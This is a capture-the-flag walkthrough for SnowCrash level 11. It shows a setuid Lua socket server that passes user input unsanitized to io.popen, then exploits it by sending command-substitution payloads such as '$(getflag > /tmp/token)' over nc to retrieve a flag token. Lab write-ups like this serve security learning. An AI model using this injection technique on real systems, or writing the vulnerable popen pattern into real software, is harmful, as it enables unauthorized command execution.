# Level11

## Walkthrough

We list the files in the current home directory.

```bash
level11@SnowCrash:~$ ls -la
total 16
dr-xr-x---+ 1 level11 level11  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level11 level11  220 Apr  3  2012 .bash_logout
-r-x------  1 level11 level11 3518 Aug 30  2015 .bashrc
-r-x------  1 level11 level11  675 Apr  3  2012 .profile
-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
level11@SnowCrash:~$ file level11.lua 
level11.lua: setuid setgid a lua script, ASCII text executable
```

We check the content of the lua script.

```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

The script seems to:
- start a socket listening on **localhost** port **5151**
- accept connections and waits for a message
- hash the received message with the **sha-1** algorithm and print a text depending of the result

We check every used lua functions in the script in order to check if one is exploitable. The `popen()` function executes a shell command in a separate process. It is calling the `echo` command in the current script, concatenated with our message.  
Like previous levels, we may be able to exploit the script with a command substitution.

```bash
level11@SnowCrash:~$ nc localhost 5151
Password: $(getflag)
Erf nope..
```

The `popen()` function stores its output in the `prog` variable. To counter this, we have to save the result of the `getflag` command in a file inside `/tmp`.

```bash
level11@SnowCrash:~$ nc localhost 5151
Password: $(getflag > /tmp/token)
Erf nope..
level11@SnowCrash:~$ cat /tmp/token
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```
